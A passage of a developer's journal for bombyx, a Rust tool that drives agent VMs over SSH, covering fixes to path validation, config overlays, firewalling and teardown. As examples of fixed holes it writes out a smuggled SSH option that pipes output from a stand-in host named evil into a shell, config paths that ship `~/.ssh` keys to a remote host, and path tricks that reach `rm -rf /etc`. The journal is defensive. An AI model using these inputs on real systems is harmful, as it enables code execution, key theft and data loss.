loop, troubleshooting. Its bombyx output is real -- captured by
building a sample project in a scratch directory, including the
two failure cases -- but the Vagrantfile and `provision.sh` have
not been booted, and the page says so in its header.

One claim in it was wrong and got corrected on the spot: that a
laptop is a pointless VM host because "the isolation buys you
nothing". A VM on your own machine still gives a separate
kernel, no mounted host filesystem and no credentials in the
guest. What it gives up is escape-resistance and network
isolation. Same-machine operation also needs no code: `host` is
an SSH alias, so it can point at loopback, given a POSIX login
shell and libvirt on the far side.

### 2026-08-11

**`vagrant_dir` would tar whatever you pointed it at**

Found by the red team while reviewing the config overlay, and
much worse than the thing it was reviewing.

`vagrant_dir` was checked for being non-empty and not starting
with `-`, and nothing else. `main.rs` does
`current_dir().join(&cfg.vagrant_dir)`, and `Path::join` with an
absolute operand *discards the left side*. So a `bombyx.toml`
saying `vagrant_dir = "C:/Users/igor/.ssh"` made a plain
`bombyx up` run:

```
tar -czf ... -C C:/Users/igor/.ssh .
scp ... frosti:...
```

Reproduced live before fixing it. `bombyx.toml` travels inside a
repo -- the module doc has said so since the beginning, and the
`host` charset check exists because of it -- so this was a clone
away from shipping the operator's private keys to a host the
same file named.

The guard is `check_project_relative`, and the test enumerates
the family rather than the case that prompted it: `/etc`,
`\Windows`, `C:/...`, `c:\...`, `~/.ssh`, `../../.ssh`,
`vagrant/../../.ssh` and `./vagrant`. The Windows drive letter
is checked explicitly instead of relying on `Path::is_absolute`,
because that answers per-platform: `C:/x` is *not* absolute on
Unix, and the same config file is read on both.

Worth noting what the existing conventions did and did not
catch. "Validate a field's invariants where the field lives" put
the fix in one obvious place. But `remote_root` -- the field
that reaches `rm -rf` -- had a careful depth and traversal
guard, while `vagrant_dir`, which reaches `tar`, had none. The
dangerous-looking field got the attention.

**A committed config cannot name everyone's VM host**

The question that produced this was about jutro rather than
bombyx: the provisioning script hardcoded a git identity, and
"how does a second person use this?" has an obvious answer --
they cannot, their agent's commits would be authored as me.

jutro already had the pattern, twice: `.deploy.sample` and
`.ports.sample` are committed, `.deploy` and `.ports` are
gitignored, each saying "copy this and customize". So the VM
config follows it, and the Vagrantfile reads `vagrant/local.env`
if it is there.

One level up, `bombyx.toml` has the same problem and no answer
at all. `host` is per-developer -- everyone has their own VM
host -- while `project` and the rest are shared. The only escape
hatch was `--config`, which means either committing a file
nobody can use or every developer maintaining an untracked copy
of the whole thing.

So `bombyx.local.toml` beside the config now overrides any of
its fields. The detail worth recording is the *order*:
validation runs after the merge, not before. Validating the base
first would make the overlay the one path into the config that
skips the charset check on `host` -- and `host` is passed to
`ssh` as the first positional argument, where a leading `-` is
read as an option. There is a test asserting an overlay cannot
smuggle one through.

The other decision was the filename. A fixed `bombyx.local.toml`
would ignore `--config`; deriving it by inserting `.local`
before the extension means `staging.toml` looks for
`staging.local.toml`, so the override is always named after the
file it overrides.

Verified against frosti rather than by dry run, and the shape of
the check is the point: a committed config naming
`unreachable-host-xyz`, an overlay naming `frosti`, and a real
`bombyx status` that came back with live VM state. A dry run
would have proved only that the argv said `frosti`.

### 2026-08-10

**The agent VM could reach the whole house**

Setting up the first real agent VM raised an obvious question --
what can it actually talk to? -- and the answer was worse than
expected. vagrant-libvirt puts guests on a NAT'd network where
**the VM host is the gateway**, and because the host routes for
the guest, everything the host can reach the guest can reach.
On frosti that meant the home LAN and its router, the tailnet,
Docker networks, other libvirt networks, and frosti's own
services -- `sshd` and libvirtd included, since the gateway is
just an address a guest can connect to.

That last part is the one that stings. The VM exists on the
assumption that the code inside it may be hostile. The machine
controlling it should not be one hop away with its SSH port
open. And the VM host holds a broadly scoped credential, so the
containment protected the workstation's credentials while
leaving a path to a machine holding other credentials.

`scripts/agent-vm-firewall.sh` closes it with an nftables table
of its own, so libvirt's rules are untouched and one command
removes the lot. Two rules in it look optional and are not: the
`established,related` accept on the input chain is what lets a
guest answer a connection *the host started*, which is exactly
how `vagrant ssh` works -- drop it and every bombyx command that
touches a VM dies -- and the DHCP/DNS accepts keep dnsmasq
reachable, without which the guest silently has no network at
all.

Writing it meant arguing with `CLAUDE.md`, which prefers a
written record over a setup script. The exception holds here for
a narrow reason worth stating: the objection is that a stale
script fails part-way through as root having changed some things
and not others. This one loads a single self-contained table and
does nothing else, so it either takes effect or it does not.
`docs/vm-host-setup.md` still carries the explanation; the
script is only the convenience.

Marked *(unverified)*, because `sudo` on frosti needs a password
and cannot run from a bombyx session. `show` was exercised for
real; `apply` was not, and saying so is cheaper than discovering
later that the file implied more confidence than it had.

The first draft drew **22 review findings across 270 lines**,
which is the number worth remembering. Several were the same
shape: the tool whose entire job is isolation could silently
stop isolating. `apply` truncated the rules file and deleted the
loaded table *before* validating the new one, so a parse error
left the host with nothing; `persist` ordered its unit after
libvirt when the hazard is `nftables.service`; the IPv4 denylist
said nothing about IPv6, so a LAN with native IPv6 stayed
reachable by global address while the IPv4-only verification
snippet passed. The rewrite validates with `nft -c` first, loads
declare-then-delete as one transaction, orders after
`nftables.service`, and refuses IPv6 outright.

Two smaller ones are worth repeating because they are habits
rather than bugs. `usage()` printed its own header by slicing
line numbers out of `$0`, and the range had already drifted past
the comment into `set -euo pipefail` -- help text that was
literally shell source. And the doc reproduced the whole
ruleset, which had already diverged from what the script
generates. Both are the same mistake: a second copy of something
that has one source of truth.

Two corrections landed while writing it, both from checking
rather than reasoning. Guests on the *same* bridge still reach
each other -- that traffic is bridged at layer 2 and the forward
hook never sees it -- so a scratch VM sits beside a project VM
unseparated. And an earlier claim that the deploy key was
repo-scoped was wrong: the VM host's `ssh_config` names a personal
account-level key, and `IdentitiesOnly=yes` does not
exclude identities named in the config, so the first test
authenticated as the account. `-F /dev/null` gives the honest
answer.

**`bombyx provision`, and a failing first run that was worth
more than a passing one**

Setting up the first real agent VM turned up a gap. `bombyx up`
pushes the project's `vagrant/` directory to the host, but
vagrant provisions a machine only when it first creates it --
every later `vagrant up` skips the provisioners, whether the VM
was halted or running. So an edited `provision.sh` reached the
host and nothing executed it -- and the push reported success,
which is what made it hard to see.

I had this wrong in the first draft of every doc string, writing
that `up` skips provisioning on a VM that is "already running".
The review caught it. The wrong rule is worse than no rule: it
tells someone with a *halted* VM that the caveat does not apply
to them, so they run `up`, watch it boot, and walk back into the
same silent failure. The only way to apply a provisioning edit was
`ssh frosti` and `vagrant provision` by hand, which contradicts
the one thing bombyx is for: the operator stays on the
workstation.

`bombyx provision` closes it. The implementation is small --
`boot()` became `push_then()`, taking the closing vagrant
subcommand, so `up`, `scratch` and `provision` share one push
sequence. That sharing is the point rather than tidiness:
`scratch` had already drifted once into booting an empty
directory, and a separately-written `provision` would have been
free to skip the push and re-run the stale copy on the host,
which is the exact bug it exists to fix.

The real run against frosti **failed**, and that was the more
useful outcome. A bug in the VM's own provisioning script made
`vagrant provision` exit 1, and bombyx surfaced vagrant's output
and propagated the non-zero exit rather than reporting success.
A clean first run would have proved less: error propagation got
exercised for free, on a path I had not written a test for.

Two lessons from that failure, neither about bombyx:

- The guest script checked for existing swap with a bare
  `swapon --show`. `swapon` lives in `/usr/sbin`, which is not
  on the `PATH` a non-interactive shell gives an unprivileged
  user, so the check failed with "command not found" instead of
  answering -- and under `set -e` inside `if !` that reads as
  "no swap", so the script tried to re-create a swapfile that
  was live. It is the same non-interactive `PATH` trap
  `vm-host-setup.md` documents for vagrant, one level down in
  the guest. The creation step had worked on the first run only
  because `sudo swapon` gets root's `PATH`.
- I piped the first run through `tee`, so the exit status I read
  was `tee`'s, not bombyx's -- a pipeline reports only its last
  command. Never pipe the command whose exit code is the thing
  being verified.

The symptom that started all of this was arrow keys printing
`^[[A` inside the VM. Two plausible causes were wrong before the
right one: the PTY was fine (`ssh -t` already allocated one) and
`TERM` was fine (`xterm-256color`, present in the guest's
terminfo). The cause was the box creating its user with
`/bin/sh`, which on Debian is dash -- no line editing at all.
The tell was in the prompt the whole time: a bare `$ ` rather
than bash's `user@host:dir$`. Worth remembering that dash never
consults `TERM` or terminfo, which is exactly why both checks
came back clean.

**A doc gate, because two broken links had been sitting there**

`cargo doc` reported two broken documentation links in this repo:
`config`'s module page pointed at the private `Config::validate`,
and an xtask doc comment linked `test`, which is both a function
and an attribute macro. Neither had ever failed anything, because
rustdoc reports link problems as *warnings* — so the docs build
cleanly and quietly stop navigating.

Fixing the two links was a minute. The interesting half was that
nothing caught them, so `cargo xtask doc` now exists and runs as
the fifth `validate` gate and in the Stop hook.

It runs rustdoc **twice**, and that is the part worth writing
down, because it looks like belt-and-braces and is not. A broken
link fails in one of two ways and neither pass sees both:

- A link inside a *private* module naming something out of scope.
  The public pass never renders a private module's docs, so it
  reports nothing at all.
- A *public* page linking to a private item. That is an error in
  the public pass and perfectly legal in the private one —
  rustdoc even suggests `--document-private-items` to make it
  resolve.

I measured this rather than assuming it: breaking the link in
`doctor::text` gave 0 errors in the public pass and 2 in the
private one. Had I shipped one pass, the gate would have reported
success on a whole class it cannot see — which is the same shape
as every bug this feature produced, so it seemed worth not
repeating.

Adding the CHANGELOG entry then found a third thing: `cargo xtask
changelog add` glued a newly created `### Fixed` heading directly
onto the last bullet of the previous section, because it always
assumed a blank line above the insertion point. The skeleton the
tests used had one; a real file that ends `[Unreleased]` with a
bullet does not. A heading with no blank line above it renders as
body text. Fixed, with a test using the real-file shape.

**`bombyx doctor`, and three rounds of learning to distrust a
green result**

`bombyx up` changes state before it runs `vagrant`: it creates a
directory on the host and ships a tarball there. So a host
missing a piece reported it half-way through, and the worst case
-- `bash: vagrant: command not found` -- is one that **nothing
else can report**, because vagrant cannot tell you it is
invisible to a non-interactive shell when it is not running.
`bombyx doctor` now checks eleven things up front, changes
nothing, and runs every probe rather than stopping at the first
failure.

The feature was small. Getting it *honest* took three review
rounds, and the same mistake kept coming back in different
clothes: **a check that passes while proving less than it
claims.**

- The first libvirt check was `virsh list --all`, which for a
  non-root user silently answers from a per-user
  `qemu:///session` instance. It would have passed with no group
  membership at all.
- The login-shell probe printed `$SHELL` and passed on any zero
  exit, so a `fish` login shell -- the exact state it existed to
  catch -- reported `ok`. It now makes the shell *run* a POSIX
  construct and print a token, which is checked.
- The project-directory probe passed on a *file* named `~/vms`.
  Verified before the fix: doctor printed `all checks passed`
  and `up` then died on its first command.
- The provider probe kept only `grep`'s exit status, discarding
  vagrant's own, and matched an unanchored substring.
- The directory walk tested `-e`, which is false for a dangling
  symlink, so it stepped *past* one to a writable parent and
  passed -- while `mkdir -p` fails there with `File exists`.

So the module's governing rule is written at the top of
`doctor.rs`: a probe must carry a verdict, not a value. Where the
shell cannot decide, the verdict is applied in Rust and tested.

The second recurring shape was **hand-rolling something with
more edge cases than it looks like it has.** Four separate
findings -- executable permission bits, `PATHEXT` ordering,
quoted `PATH` entries, backtracking past a candidate that
matches by name but cannot run -- were one mistake in a
hand-written `PATH` search. The fix was to delete the search and
take the `which` crate, keeping only the decision that is
bombyx's own, expressed as a subtraction: **never search the
working directory.** On Windows the OS search includes it, and
`doctor` is the command the documentation tells you to run first
in a fresh clone -- so a repo shipping a `tar.exe` was
workstation code execution. That resolution now applies to the
push path too, and it is done up front, so a missing `tar` fails
before `up` has created anything on the host.

I made the same mistake once more while fixing it. The provider
probe's two failures (vagrant absent vs plugin absent) used to
read identically, so I composed a better message with a `tail`
subshell -- and it broke against a real host, because a `PATH`
broken enough to hide `vagrant` hides `tail` too, and the reason
came back empty. Printing the label *before* vagrant's own
output instead makes vagrant's last line the reason and needs no
extra tool. That one is worth remembering: I only found it
because I ran the failure path against frosti rather than
reasoning about it.

Which is the other lesson. Every claim in this feature that
turned out to be false was one a passing test suite had already
endorsed.

Four review rounds in total, and the last two each found a bug
inside the fix from the round before. Round three found that the
`PATH` module written to stop the working directory being searched
could still return a relative path and execute it: with no
absolute entry on `PATH` the filtered list is an empty string, and
`split_paths("")` yields one *empty* entry rather than none, which
on Unix means the working directory. Round four, scoped to only
the guards round three had rewritten, found that my new read-only
check had *regressed* against the substring version it replaced --
it stopped at `sudo` and so read `sudo mkdir -p "$d"` as
read-only -- plus a panic on non-ASCII input and a `>&file`
redirection I had wrongly classified as harmless.

So the rule I would keep from this: when a review finds that a
guard covers a sample of its input family rather than the family,
the rewrite needs its own review. Twice now the fix has been the
new bug, and both times a scoped re-review found it in one pass.

**Teardown, and a latent hole that the feature would have
turned into a weapon**

bombyx could create a persistent VM but not remove one. The
ephemeral lifecycle was symmetric -- `scratch` makes a VM and
`discard` destroys it -- while the persistent one was not:
`up` created, `down` only halted, `reset` rolled back, and
nothing removed. Tearing down the test VM from the first real
run meant abandoning bombyx and running `vagrant destroy -f`
over SSH by hand, which is exactly what the tool exists to
avoid. So `bombyx destroy <project>` now exists, and both it
and `discard` remove the VM's directory on the host once the
VM is gone. That last part makes the README's claim that
nothing survives a scratch VM true; before, the directory and
its pushed Vagrantfile stayed behind, one per discarded VM.

The interesting part was not the feature. It was what planning
the feature turned up.

Adding `rm -rf` to the command set meant looking hard at how
the target path gets built, and that surfaced something
already in the code: `remote_root` was never checked for a
`..` segment. `remote_root = "~/.."` parsed cleanly and
produced `mkdir -p ~/'../phren'`. On its own that is a
nuisance -- a directory in the wrong place. Combined with
`rm -rf` it becomes `rm -rf ~/'../igor'`, which is a home
directory. And `bombyx.toml` travels inside a project repo, so
its contents are attacker-controlled from the moment you check
out someone else's branch.

Worth naming the shape of that: the bug was already there and
was genuinely harmless. The new feature would not have
introduced it; it would have changed its severity from
cosmetic to catastrophic. A latent defect's blast radius is a
function of what else the program can do, so adding a
destructive capability means re-auditing the inputs that feed
it, not just the new code.

So the `..` rejection landed first, as its own step, with a
test that failed against the old code to prove the hole was
real. `remove_dir` then got a second, independent guard: it
refuses a target fewer than two path segments below `~` or
`/`, so even a careless `remote_root` cannot turn a teardown
into deleting a top-level directory. Two guards rather than
one, because they fail differently -- the first stops escaping
the root, the second stops the root itself being too shallow
to be safe.

Then the reviewers took the guard apart, and they were right
to. Three findings are worth keeping.

**The floor I had just added was bypassable in five
characters.** It counted textual path segments and I had
rejected `..` but not `.`. So `remote_root = "/."` with
`project = "etc"` looked two segments deep, passed, and emitted
`rm -rf '/./etc'` -- which is `rm -rf /etc`. Chaining dots
inflates the count arbitrarily. I had written a doc comment
claiming the floor stopped exactly this.

**And it was only half a guard.** The floor lived in
`remove_dir`, so the same configuration was illegal to delete
but legal to write: `remote_root = "/"` made `bombyx up` emit
`mkdir -p '/etc'` and extract a tarball into it, while
`destroy` refused to touch the same path. Overwriting `/etc` is
no better than deleting it. Both reviewers said independently
that the check belonged in `Config::validate`, and moving it
there fixed the asymmetry and removed the `Result` cascade the
guard had pushed through `remove_dir`, `tear_down`, `plan` and
`main` -- so the final version is both safer and smaller.

**The confirmation confirmed the wrong thing.** I had claimed
that typing the project name catches running `destroy` from the
wrong directory. It does not: `project` is read from the same
`bombyx.toml` that decides which directory gets deleted, so a
repo can name itself after a VM you care about, and typing the
name it chose proves nothing. `destroy` now prints the resolved
`<host>:<directory>` on both the refusal and the confirmation,
because that is the value the operator can check against
reality. The README claim was corrected rather than defended.

One more, unprompted by any hostile input: an interrupted first
push leaves a directory with no Vagrantfile, where
`vagrant destroy -f` exits non-zero forever. Since teardown
stops at the first failure, the removal never ran and no bombyx
command could clear that directory. The destroy step now skips
when there is no Vagrantfile, so teardown is re-runnable.

Verified against frosti rather than inferred: a real `destroy`
removed the domain and `~/vms/vmtest`, a real `discard` removed
`~/vms/scratch/vmtest/pr-9`, both left the parent tree intact,
and a deliberately stranded directory with no Vagrantfile was
cleared with exit 0. The three bypasses were each re-run after
the fix and now fail when the config loads.

**Making the work queue tell the truth**

Fixed the `cargo xtask todo` defect found during the first real
run, before touching anything else, on the grounds that a queue
which silently omits items is worse than no queue: every other
decision about what to do next was being made from a list that
was quietly incomplete.

The reader now accepts all three bullet spellings the file has
always contained, rather than only the two that `todo add` and
`todo done` write. `todo list` went from six entries to nine,
and three of the six it did show had summaries cut off
mid-phrase.

The truncation half turned out to be more interesting than the
original note suggested. My first guess was to rejoin the
wrapped continuation lines when reading, but that cannot work:
`add` wrote a wrapped summary with a two-space indent and wrote
the `--body` with the same two-space indent, so the second line
of a summary and the first line of a body are structurally
identical. No reader can tell them apart. The ambiguity had to
be removed at the source instead, by keeping the summary on one
line and refusing one that would not fit. That converts the
CLI's advisory "80 chars recommended" into a checked contract,
and the error names the exact budget left after the slug.

Closed the item with the repaired tool, which felt like the
right test of it.

The reviewers then found two regressions in the fix itself,
both from the same cause: replacing `wrap_markdown` with a
strict one-liner threw away two things wrapping had been doing
incidentally. First, `add --issue` builds a label carrying the
slug twice, so for an ordinary slug the label alone nearly
fills the line and the summary had a budget of zero -- a
documented flag went from working to impossible. It now uses
the same two-line shape `done` writes, label then indented
summary. Second, `wrap_markdown` split on whitespace, which
quietly collapsed newlines; the replacement did not, so a
summary containing a newline was written verbatim and spliced a
second bullet into the file. A crafted `--summary` could have
planted a phantom entry, or a colliding slug that blocks a
legitimate `add`. Interior whitespace is now collapsed before
the width is measured.

Worth noting what kind of mistake that was. Neither regression
was in the logic I was thinking about; both were in behaviour I
removed without noticing it was load-bearing. That is the
characteristic risk of replacing a general-purpose helper with
a stricter one.

**The first real run**

bombyx has now driven a real VM on a real host, end to end.
Until today everything it did was proven only by unit tests
and by `--dry-run`, which shows the argv it would execute but
says nothing about whether the far end accepts it. That gap
was the oldest open item on the list, and closing it was worth
the effort: it confirmed the fixes and it found three things
the tests could not.

Set up frosti first: Ubuntu 24.04 with QEMU, libvirt, Vagrant
2.4.9 and vagrant-libvirt 0.12.2. Two things about that are
worth remembering. Ubuntu 24.04 does not package Vagrant at
all, so it has to come from HashiCorp's repository, and
`qemu-kvm` has been renamed `qemu-system-x86`. All of it is
written up in `docs/vm-host-setup.md`.

Then ran the whole surface against a throwaway project:
`up`, `status`, `shell`, `down`, `scratch`, `discard` and
`reset`, plus a second `up` to check that pushing twice is
safe, and a deliberate `discard ../../../../etc` to see the
name validation refuse it.

**Everything the reviewers made us fix, held up.** The most
satisfying one was the tilde. The remote shell resolved
`~/'vms/vmtest'` to `/home/igor/vms/vmtest`, and no directory
literally named `~` was created anywhere. That was the bug
that 82 unit tests had asserted *into* place, so seeing the
corrected form work against a real shell is the clearest
possible answer to why a real run was needed.

The rest of the push behaved as designed. After two pushes the
`Vagrantfile` sat directly in `~/vms/vmtest/`, with no nested
`vagrant/` directory, so the `scp -r` nesting problem is
genuinely gone. The VM's `.vagrant` identity directory
survived the second push with its domain id intact, which is
the `--exclude=./.vagrant` fix working. No push archive was
left behind on either end. Scratch VMs landed in
`~/vms/scratch/vmtest/pr-1234`, scoped by project as intended.
Exit codes propagated: `status` against a directory that did
not exist returned 1 and named the command that failed.

Vagrant's own log gave the neatest confirmation that the seam
works, describing the domain it built as
`Source: /home/igor/vms/vmtest/Vagrantfile` -- the file bombyx
had pushed, in the directory bombyx had created. And
`bombyx shell` reached all the way inside, printing
`vmtest / vagrant / 6.8.0-136-generic` from the guest.

**Three findings.** `discard` destroys the VM but leaves the
scratch directory sitting on the host, which makes the
README's claim that "nothing survives" untrue as written.
`reset` restores a snapshot called `fresh-install` that no
bombyx command ever creates, so on a new project it can only
fail -- it does fail cleanly, but the workflow has a hole in
it. Both are captured.

The third is more embarrassing and more useful.
`cargo xtask todo` writes entries as `**slug**` but its reader
only recognises that same bold form, and the four
hand-written entries in `docs/todo.md` use backticks instead.
So `todo list` has been silently omitting them since the day
they were written, `todo done first-real-run` could not find
the very item this work closed, and I reported that truncated
list as complete more than once without noticing it disagreed
with the file.

That is the same shape as the tilde bug and as the libvirt
check I wrote earlier today, which passed by connecting to a
per-user libvirt instance rather than the system one and so
proved nothing. Three times in two days, the failure was not
a red result. It was a green one that did not mean what it
appeared to mean.

### 2026-08-09

**Dropping the frontend tooling, and the npm awareness
behind it**

The CLI-only prune removed the web crate, the frontend and
the E2E suite, but left every piece of tooling that served
them: five `xtask` frontend modules, two dev-server shell
scripts, and a set of `.gitignore` blocks for Playwright and
Node. None of it could run -- there was nothing to point it
at -- so it was pure carrying cost, and `/template-sync` had
to reconcile all of it on every future sync.

Deleting that much is easy. The interesting part was the
second decision: whether the *npm awareness* in the tooling
that survived should go too. `cargo xtask audit` ran
`npm audit` only when `frontend/package.json` existed, and
the dependency-cooldown gate watched a
`frontend/package-lock.json` that will never appear. Both
already degraded cleanly to nothing. Keeping them cost
nothing at runtime; removing them meant deleting ~400 lines
of working, tested code.

Chose to remove. A half-supported second ecosystem is worse
than none: it reads as a capability the project has, and the
next person to touch `dep-age` would have to understand and
maintain a code path that cannot fire. `xtask` is now
Rust-only end to end -- `audit.rs` lost `NpmAudit` and its
runner, `dep_age.rs` lost `npm_version_date` / `npm_versions`
and the registry arm, and `gate.rs` lost `parse_npm_lock` and
its lockfile entry.

`Ecosystem` survives as a **single-variant enum**, and the
`cargo` argument stays on the command line
(`dep-age cargo serde`). That is deliberate: it keeps the
command stable and means adding a second registry later
needs no CLI change. It costs a one-armed `match` in three
places, which is the honest price of that option.

The one real trap was in `sync.rs`. Its `categorize` function
lists `frontend/` and `e2e/` as boilerplate prefixes, and
deleting them looks exactly as correct as everything else in
this change. It would have been wrong: those prefixes
classify paths in the **upstream rustbase diff**, which still
has a frontend, so removing them would silently drop upstream
frontend changes into the wrong bucket during
`/template-sync`. Left in place with a comment saying why,
since the next cleanup pass will be tempted the same way.

Verified the survivors against the live registry rather than
trusting the suite: `dep-age cargo serde` resolves and dates
correctly, `--latest-aged` still prints a pin target, `audit`
reports without an npm segment, `dep-age-check` is a clean
no-op, and `dep-age npm vite` now fails at the CLI boundary
with `invalid value 'npm' [possible values: cargo]` rather
than panicking.

Net: 784 lines deleted, and `cargo xtask --help` no longer
advertises four commands that could not work.

**Initial scaffold: a thin SSH control plane for agent VMs**

Started bombyx from the
[rustbase](https://github.com/breki/rustbase) template at
`f40582f` (v0.17.0), pruned to a CLI-only project -- the
template's web crate, frontend, E2E suite and deploy
subsystem are all gone, since bombyx has no runtime
services.

The shape of the tool follows from one decision: **the repo
is the source of truth, and the VM host holds only a
cache**. Each project keeps its `vagrant/` directory in its
own repo; `bombyx up` pushes it to the host and then runs
`vagrant` there over SSH. The host can therefore never
silently drift from the repo, and there is no state on the
host worth backing up.

The second decision is **wrap, don't reimplement**. bombyx
composes `ssh`, `scp`, `tar` and `vagrant` and nothing more.
If it breaks, `ssh frosti` and `vagrant up` by hand still
work -- which matters for a tool whose job is to be the only
thing standing between an agent and your credentials.

Four modules carry the work:

- `config.rs` parses `bombyx.toml` into typed `thiserror`
  errors and resolves the remote paths.
- `name.rs` holds `ScratchName`, a validated single path
  segment.
- `remote.rs` builds the command lines. Nothing here spawns
  a process: every function returns the argv to run.
- `plan.rs` maps an `Action` to the ordered command list.

Keeping the command construction pure is what makes
`--dry-run` trustworthy enough to develop against, and it is
why `plan.rs` lives in the library rather than in
`src/bin/` -- the project excludes `src/bin/` from coverage,
so policy sitting there would ship untested.

**The push mechanism took two attempts.** The obvious
`scp -r vagrant host:~/vms/phren/` is wrong, and wrong in a
way that only shows up on the *second* run: `scp -r` copies
*into* an existing destination, like `cp -r`. The first push
creates `~/vms/phren/vagrant`; the second creates
`~/vms/phren/vagrant/vagrant`, one level deeper every time.
Replaced it with a tar round-trip -- `tar -czf <a> -C <dir>
.` locally, `scp` the archive, then extract on the host. The
`-C <dir> .` is the load-bearing part: it archives the
directory's *contents*, so extraction lands files directly
in the target and repeated pushes overwrite in place.

`rsync` would have solved this more cleanly, and was
rejected on one ground: it is not present on a stock Windows
workstation, which is exactly where bombyx runs.

A related bug fell out of the same pass: `up` pushed to one
directory but ran `vagrant` in another, and `scratch` never
pushed at all, so it ran `vagrant up` in an empty directory,
guaranteed. Both now go through a shared `boot` helper.

**Then the reviewers took the scaffold apart.** Two
read-only agents (a security/correctness pass and a
craftsmanship pass) reviewed the initial commit and returned
23 findings between them, four of which they raised
independently. Enough of them were real, and load-bearing,
that fixing them before the first commit was the only honest
option. The ones worth recording:

*The default configuration did not work.* Every remote path
was single-quoted for safety, including the default
`remote_root = "~/vms"`. A POSIX shell does not expand `~`
inside single quotes, so `mkdir -p '~/vms/phren'` created a
directory *literally named* `~` under the login directory.
Meanwhile the `scp` destination interpolated the same path
unquoted, where `~` *does* expand -- so the archive landed
in the real `$HOME/vms/phren` while `vagrant up` ran in the
bogus tree with no Vagrantfile. Worse, the tests asserted
the quoted form, so they locked the bug in. The fix is
`quote_remote_path`, which leaves only the tilde outside the
quotes: `~/'vms/phren'`. Everything an attacker could
influence stays quoted, and the shell still expands the home
directory.

That one is the cleanest illustration of why the project's
Definition of Done requires a real VM host: the argv was
provably correct and provably useless.

*Two ways a cloned repo could run code on the workstation.*
`host` was passed as the first positional argument to `ssh`,
which has no `--` separator -- so a repo shipping `host =
"-oProxyCommand=curl evil|sh"` would execute that on *your
machine*, from a bare `bombyx status`, before any network
traffic. And the `scp` destination was the one path in the
module that skipped quoting entirely. Since `bombyx.toml`
travels inside a repo, it is attacker-controlled data the
moment you check out someone else's branch. Both are now
closed by allowlist validation in `Config::validate`. For a
tool whose entire purpose is containing untrusted code,
shipping either would have been embarrassing.

*Quoting is not validation.* The `scratch <name>` argument
was correctly quoted and still a traversal: `'../../../../etc'`
is a perfectly valid quoted string that still means `/etc`,
and the next step extracts a tar over it. `ScratchName` now
makes the safe shape a parsing step, so an invalid name
cannot reach a path at all. Related: scratch directories
omitted the project name, so `scratch pr-1` from two
projects resolved to the same directory on the host.

*The push clobbered the thing it promised not to.* The doc
comment and the README both stated that `.vagrant/` on the
host is left alone. But `tar -C <dir> .` includes dotfiles,
so a developer who had ever run `vagrant` locally shipped
their own `.vagrant/` and overwrote the host's machine
identity, orphaning the running VM. Now excluded explicitly,
with a test.

*Windows, the primary platform.* `std::env::temp_dir()`
returns `C:\Users\...`, and `scp` reads everything before
the first colon as a host name -- so `up` would have tried
to connect to a host called `C`. The archive now keeps a
bare file name and `tar`/`scp` run *in* its directory.

The remaining fixes were smaller: a fixed temp-file name
replaced by a per-run private directory (a co-user could
pre-create the path; two concurrent runs raced; and
`--dry-run` deleted the file, so a flag documented as
"print, don't run" had a destructive side effect); `&&`-
chained remote cleanup that skipped on failure and left a
corrupt archive in the boot directory; remote exit codes
flattened to 1; `deny_unknown_fields` so a typo'd key is
reported instead of silently defaulting; and a batch of
loose `contains`/`starts_with` assertions replaced by
full-value and ordering checks, which is what let several of
these through in the first place.

Ended at 96 tests and 100% coverage.

**Status:** the command surface works and is well covered,
but it *still* has not been driven against a real VM host.
`--dry-run` proves the argv, and this session is a good
lesson in how little that guarantees. That verification is
the next step and is required before any of this can be
called done.
